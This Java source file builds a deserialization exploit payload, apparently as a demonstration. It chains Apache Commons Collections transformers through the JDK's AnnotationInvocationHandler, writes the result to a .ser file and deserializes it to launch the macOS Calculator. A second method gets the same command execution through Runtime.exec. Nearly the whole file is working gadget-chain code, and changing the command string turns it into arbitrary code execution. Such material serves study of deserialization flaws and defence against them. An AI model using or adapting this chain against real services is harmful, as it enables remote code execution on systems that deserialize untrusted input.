package example;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

import static java.util.Collections.singletonMap;

@SuppressWarnings("unchecked")
// tag::region[]
public class PayloadGenerator {
    public static void main(String[] args) throws Exception {
        final String[] execArgs = new String[] {
                "/Applications/Calculator.app/Contents/MacOS/Calculator" };

        // invoking new ProcessBuilder(execArgs).start()
        final Transformer transformers = new ChainedTransformer(
            new ConstantTransformer(ProcessBuilder.class),
            new InstantiateTransformer(new Class[]{String[].class},new Object[]{ execArgs }),
            new InvokerTransformer("start", null,null));

        // preparing fieldMap for @Target.value == "value"
        String annotationFieldName = Target.class.getDeclaredMethod("value").getName();
        final Map annotationFields = singletonMap(annotationFieldName,"foo");

        // decorating map with process starting transformers
        TransformedMap transformedMap =
                TransformedMap.transformingMap(annotationFields, null, transformers);

        // setting up AnnotationInvocationHandler with prepared instancedata to be serialized
        Class<?> type = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = type.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object handler = constructor.newInstance(Target.class, transformedMap);

        // serializing handler
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("transformer.ser"));
        oos.writeObject(handler);
        oos.close();

        // demonstrating deserialization starts calculator
        new ObjectInputStream(new FileInputStream("transformer.ser")).readObject();
    }
// end::region[]














    public static void main2(String[] args) throws Exception {
        final String[] execArgs = new String[] { "/Applications/Calculator.app/Contents/MacOS/Calculator" };
        final Transformer transformerChain = new ChainedTransformer(
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs)
                );

        final Map annotationAttributeValue = new HashMap();
        annotationAttributeValue.put("value","value");

        TransformedMap transformedMap = TransformedMap.transformingMap(annotationAttributeValue, null, transformerChain);


        Class<?> type = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = type.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        constructor.newInstance(Target.class, transformedMap);

        ((Map.Entry)transformedMap.entrySet().iterator().next()).setValue("foobar");
    }
}
